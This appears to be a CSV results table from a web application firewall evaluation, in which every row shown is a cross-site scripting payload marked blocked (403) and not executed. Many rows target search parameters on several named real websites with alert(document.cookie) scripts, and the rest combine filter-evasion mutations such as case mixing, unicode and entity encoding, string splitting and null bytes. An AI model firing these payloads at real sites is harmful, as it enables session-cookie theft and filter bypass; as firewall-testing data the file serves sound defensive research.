status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=%00<script>alert(document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.marinesanctuariesmedia.com/search.php?keyword=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,36.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<SCRIpT>alert(document.cookie);</SCRiPT>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script><script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,//www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,"http://www.cameraforless.com/search.asp?keyword=<script>/drfv/
alert(document.cookie);</script>",diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert`document.cookie`;</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=%00<script>alert(document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.cameraforless.com/search.asp?keyword=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,37.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<ScriPT>alert(document.cookie);</ScriPt>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script><script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,//www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,"http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>/drfv/
alert(document.cookie);</script>",diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert`document.cookie`;</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script%00>alert(document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://www.projusticia.org.pe/site.php?plantilla=busqueda&txt_filtro=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,38.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<scRIpt>alert(document.cookie);</ScrIPT>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script><script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,//sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,"http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>/drfv/
alert(document.cookie);</script>",diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert`document.cookie`;</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script%00>alert(document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,http://sanjuan.agendaurbana.com/buscar.php?tabla=foto&texto=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,39.0,,,,,
403,BLOCK,False,<script>alert(1)</script>,triple,,A1+A1+A1,,,,
403,BLOCK,False,<SCrIPT>alert(1)</SCRipT>,triple,,A1+A1+A4,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</script>",triple,,A1+A1+A14,,,,
403,BLOCK,False,<script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A1+A18,,,,
403,BLOCK,False,<script>top['al'+'ert'](1)</script>,triple,,A1+A1+A21,,,,
403,BLOCK,False,search?q=ok <script>alert(1)</script>,triple,,A1+A1+A23,,,,
403,BLOCK,False,<script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A1+A27,,,,
403,BLOCK,False,<scRiPt>alert(1)</sCRiPT>,triple,,A1+A4+A1,,,,
403,BLOCK,False,<sCript>alert(1)</sCriPT>,triple,,A1+A4+A4,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</SCrIPt>",triple,,A1+A4+A14,,,,
403,BLOCK,False,<ScripT>\u0061\u006c\u0065\u0072\u0074(1)</Script>,triple,,A1+A4+A18,,,,
403,BLOCK,False,<sCRipT>top['al'+'ert'](1)</SCRIpT>,triple,,A1+A4+A21,,,,
403,BLOCK,False,search?q=ok <sCRipt>alert(1)</ScrIpT>,triple,,A1+A4+A23,,,,
403,BLOCK,False,<Script>top[/al/.source+/ert/.source](1)</scripT>,triple,,A1+A4+A27,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</script>",triple,,A1+A14+A1,,,,
403,BLOCK,False,"<sCript>/drfv/
alert(1)</scRipt>",triple,,A1+A14+A4,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
alert(1)</script>",triple,,A1+A14+A14,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</script>",triple,,A1+A14+A18,,,,
403,BLOCK,False,"<script>/drfv/
top['al'+'ert'](1)</script>",triple,,A1+A14+A21,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
alert(1)</script>",triple,,A1+A14+A23,,,,
403,BLOCK,False,"<script>/drfv/
top[/al/.source+/ert/.source](1)</script>",triple,,A1+A14+A27,,,,
403,BLOCK,False,<script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A18+A1,,,,
403,BLOCK,False,<ScRipt>\u0061\u006c\u0065\u0072\u0074(1)</SCRipT>,triple,,A1+A18+A4,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</script>",triple,,A1+A18+A14,,,,
403,BLOCK,False,<script>\u0061\u006c\u0065\u0072\\u0075\u0030\u0030\u0037\u0034(1)</script>,triple,,A1+A18+A18,,,,
403,BLOCK,False,<script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A18+A21,,,,
403,BLOCK,False,search?q=ok <script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A18+A23,,,,
403,BLOCK,False,<script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A18+A27,,,,
403,BLOCK,False,<script>top['al'+'ert'](1)</script>,triple,,A1+A21+A1,,,,
403,BLOCK,False,<scRiPT>top['al'+'ert'](1)</Script>,triple,,A1+A21+A4,,,,
403,BLOCK,False,"<script>/drfv/
top['al'+'ert'](1)</script>",triple,,A1+A21+A14,,,,
403,BLOCK,False,<script>top['al'+'ert'](1)</script>,triple,,A1+A21+A18,,,,
403,BLOCK,False,<script>top['al'+'ert'](1)</script>,triple,,A1+A21+A21,,,,
403,BLOCK,False,search?q=ok <script>top['al'+'ert'](1)</script>,triple,,A1+A21+A23,,,,
403,BLOCK,False,<script>top['al'+'ert'](1)</script>,triple,,A1+A21+A27,,,,
403,BLOCK,False,search?q=ok <script>alert(1)</script>,triple,,A1+A23+A1,,,,
403,BLOCK,False,search?q=ok <SCrIpt>alert(1)</SCRIPT>,triple,,A1+A23+A4,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
alert(1)</script>",triple,,A1+A23+A14,,,,
403,BLOCK,False,search?q=ok <script>\u0061\u006c\u0065\u0072\u0074(1)</script>,triple,,A1+A23+A18,,,,
403,BLOCK,False,search?q=ok <script>top['al'+'ert'](1)</script>,triple,,A1+A23+A21,,,,
403,BLOCK,False,search?q=ok search?q=ok <script>alert(1)</script>,triple,,A1+A23+A23,,,,
403,BLOCK,False,search?q=ok <script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A23+A27,,,,
403,BLOCK,False,<script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A27+A1,,,,
403,BLOCK,False,<scRiPt>top[/al/.source+/ert/.source](1)</ScrIPT>,triple,,A1+A27+A4,,,,
403,BLOCK,False,"<script>/drfv/
top[/al/.source+/ert/.source](1)</script>",triple,,A1+A27+A14,,,,
403,BLOCK,False,<script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A27+A18,,,,
403,BLOCK,False,<script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A27+A21,,,,
403,BLOCK,False,search?q=ok <script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A27+A23,,,,
403,BLOCK,False,<script>top[/al/.source+/ert/.source](1)</script>,triple,,A1+A27+A27,,,,
403,BLOCK,False,<ScRIPt>alert(1)</scRipt>,triple,,A4+A1+A1,,,,
403,BLOCK,False,<SCriPT>alert(1)</SCrIpt>,triple,,A4+A1+A4,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</script>",triple,,A4+A1+A14,,,,
403,BLOCK,False,<sCRipT>\u0061\u006c\u0065\u0072\u0074(1)</ScrIPt>,triple,,A4+A1+A18,,,,
403,BLOCK,False,<ScRipT>top['al'+'ert'](1)</scriPT>,triple,,A4+A1+A21,,,,
403,BLOCK,False,search?q=ok <ScRIPT>alert(1)</scRIpt>,triple,,A4+A1+A23,,,,
403,BLOCK,False,<sCRIPt>top[/al/.source+/ert/.source](1)</ScrIpt>,triple,,A4+A1+A27,,,,
403,BLOCK,False,<SCRIPt>alert(1)</sCRIPt>,triple,,A4+A4+A1,,,,
403,BLOCK,False,<ScRiPt>alert(1)</ScRipt>,triple,,A4+A4+A4,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</sCRIPT>",triple,,A4+A4+A14,,,,
403,BLOCK,False,<SCript>\u0061\u006c\u0065\u0072\u0074(1)</scrIpT>,triple,,A4+A4+A18,,,,
403,BLOCK,False,<SCRipt>top['al'+'ert'](1)</sCRIpT>,triple,,A4+A4+A21,,,,
403,BLOCK,False,search?q=ok <sCRiPt>alert(1)</sCRiPT>,triple,,A4+A4+A23,,,,
403,BLOCK,False,<SCriPT>top[/al/.source+/ert/.source](1)</sCrIPt>,triple,,A4+A4+A27,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</SCripT>",triple,,A4+A14+A1,,,,
403,BLOCK,False,"<sCriPt>/drfv/
alert(1)</sCRIpT>",triple,,A4+A14+A4,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
alert(1)</ScRIpt>",triple,,A4+A14+A14,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</scrIPt>",triple,,A4+A14+A18,,,,
403,BLOCK,False,"<script>/drfv/
top['al'+'ert'](1)</SCripT>",triple,,A4+A14+A21,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
alert(1)</scRiPt>",triple,,A4+A14+A23,,,,
403,BLOCK,False,"<script>/drfv/
top[/al/.source+/ert/.source](1)</SCRipt>",triple,,A4+A14+A27,,,,
403,BLOCK,False,<ScriPT>\u0061\u006c\u0065\u0072\u0074(1)</ScRIPt>,triple,,A4+A18+A1,,,,
403,BLOCK,False,<SCripT>\u0061\u006c\u0065\u0072\u0074(1)</scRIpT>,triple,,A4+A18+A4,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</SCrIpT>",triple,,A4+A18+A14,,,,
403,BLOCK,False,<sCRipT>\u0061\u006c\u0065\u0072\\u0075\u0030\u0030\u0037\u0034(1)</sCrIPt>,triple,,A4+A18+A18,,,,
403,BLOCK,False,<ScRIpt>\u0061\u006c\u0065\u0072\u0074(1)</ScrIPT>,triple,,A4+A18+A21,,,,
403,BLOCK,False,search?q=ok <ScRIPt>\u0061\u006c\u0065\u0072\u0074(1)</scrIPT>,triple,,A4+A18+A23,,,,
403,BLOCK,False,<scriPT>\u0061\u006c\u0065\u0072\u0074(1)</ScriPT>,triple,,A4+A18+A27,,,,
403,BLOCK,False,<SCRIpt>top['al'+'ert'](1)</scRIPt>,triple,,A4+A21+A1,,,,
403,BLOCK,False,<sCripT>top['al'+'ert'](1)</SCripT>,triple,,A4+A21+A4,,,,
403,BLOCK,False,"<script>/drfv/
top['al'+'ert'](1)</ScrIpt>",triple,,A4+A21+A14,,,,
403,BLOCK,False,<SCRIpT>top['al'+'ert'](1)</SCrIpT>,triple,,A4+A21+A18,,,,
403,BLOCK,False,<scrIPT>top['al'+'ert'](1)</SCRipT>,triple,,A4+A21+A21,,,,
403,BLOCK,False,search?q=ok <scRipt>top['al'+'ert'](1)</sCripT>,triple,,A4+A21+A23,,,,
403,BLOCK,False,<sCRIPt>top['al'+'ert'](1)</SCRIPt>,triple,,A4+A21+A27,,,,
403,BLOCK,False,search?q=ok <SCript>alert(1)</ScRipt>,triple,,A4+A23+A1,,,,
403,BLOCK,False,search?q=ok <SCripT>alert(1)</scRipT>,triple,,A4+A23+A4,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
alert(1)</scRipT>",triple,,A4+A23+A14,,,,
403,BLOCK,False,search?q=ok <SCrIPT>\u0061\u006c\u0065\u0072\u0074(1)</Script>,triple,,A4+A23+A18,,,,
403,BLOCK,False,search?q=ok <sCrIpT>top['al'+'ert'](1)</ScriPt>,triple,,A4+A23+A21,,,,
403,BLOCK,False,search?q=ok search?q=ok <sCRIPt>alert(1)</ScRIPT>,triple,,A4+A23+A23,,,,
403,BLOCK,False,search?q=ok <Script>top[/al/.source+/ert/.source](1)</ScrIpT>,triple,,A4+A23+A27,,,,
403,BLOCK,False,<scRIpT>top[/al/.source+/ert/.source](1)</sCripT>,triple,,A4+A27+A1,,,,
403,BLOCK,False,<Script>top[/al/.source+/ert/.source](1)</ScripT>,triple,,A4+A27+A4,,,,
403,BLOCK,False,"<script>/drfv/
top[/al/.source+/ert/.source](1)</SCRipt>",triple,,A4+A27+A14,,,,
403,BLOCK,False,<SCRiPt>top[/al/.source+/ert/.source](1)</ScRIPt>,triple,,A4+A27+A18,,,,
403,BLOCK,False,<scRiPT>top[/al/.source+/ert/.source](1)</sCRiPt>,triple,,A4+A27+A21,,,,
403,BLOCK,False,search?q=ok <ScrIpT>top[/al/.source+/ert/.source](1)</script>,triple,,A4+A27+A23,,,,
403,BLOCK,False,<ScrIPt>top[/al/.source+/ert/.source](1)</sCRiPT>,triple,,A4+A27+A27,,,,
403,BLOCK,False,"<script>/drfv/
alert(1)</script>",triple,,A14+A1+A1,,,,
403,BLOCK,False,"<sCRIpT>/drfv/
alert(1)</SCriPT>",triple,,A14+A1+A4,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
alert(1)</script>",triple,,A14+A1+A14,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</script>",triple,,A14+A1+A18,,,,
403,BLOCK,False,"<script>/drfv/
top['al'+'ert'](1)</script>",triple,,A14+A1+A21,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
alert(1)</script>",triple,,A14+A1+A23,,,,
403,BLOCK,False,"<script>/drfv/
top[/al/.source+/ert/.source](1)</script>",triple,,A14+A1+A27,,,,
403,BLOCK,False,"<scripT>/drfv/
alert(1)</script>",triple,,A14+A4+A1,,,,
403,BLOCK,False,"<sCRiPt>/drfv/
alert(1)</ScRIPT>",triple,,A14+A4+A4,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
alert(1)</ScRIpT>",triple,,A14+A4+A14,,,,
403,BLOCK,False,"<SCriPt>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</SCrIPT>",triple,,A14+A4+A18,,,,
403,BLOCK,False,"<scRiPt>/drfv/
top['al'+'ert'](1)</sCripT>",triple,,A14+A4+A21,,,,
403,BLOCK,False,"search?q=ok <SCRIPT>/drfv/
alert(1)</ScripT>",triple,,A14+A4+A23,,,,
403,BLOCK,False,"<sCrIPt>/drfv/
top[/al/.source+/ert/.source](1)</sCRipt>",triple,,A14+A4+A27,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
alert(1)</script>",triple,,A14+A14+A1,,,,
403,BLOCK,False,"<scRIPT>/drfv/
/drfv/
alert(1)</ScRIPT>",triple,,A14+A14+A4,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
/drfv/
alert(1)</script>",triple,,A14+A14+A14,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</script>",triple,,A14+A14+A18,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
top['al'+'ert'](1)</script>",triple,,A14+A14+A21,,,,
403,BLOCK,False,"search?q=ok <script>/drfv/
/drfv/
alert(1)</script>",triple,,A14+A14+A23,,,,
403,BLOCK,False,"<script>/drfv/
/drfv/
top[/al/.source+/ert/.source](1)</script>",triple,,A14+A14+A27,,,,
403,BLOCK,False,"<script>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</script>",triple,,A14+A18+A1,,,,
403,BLOCK,False,"<ScRipt>/drfv/
\u0061\u006c\u0065\u0072\u0074(1)</SCRiPt>",triple,,A14+A18+A4,,,,
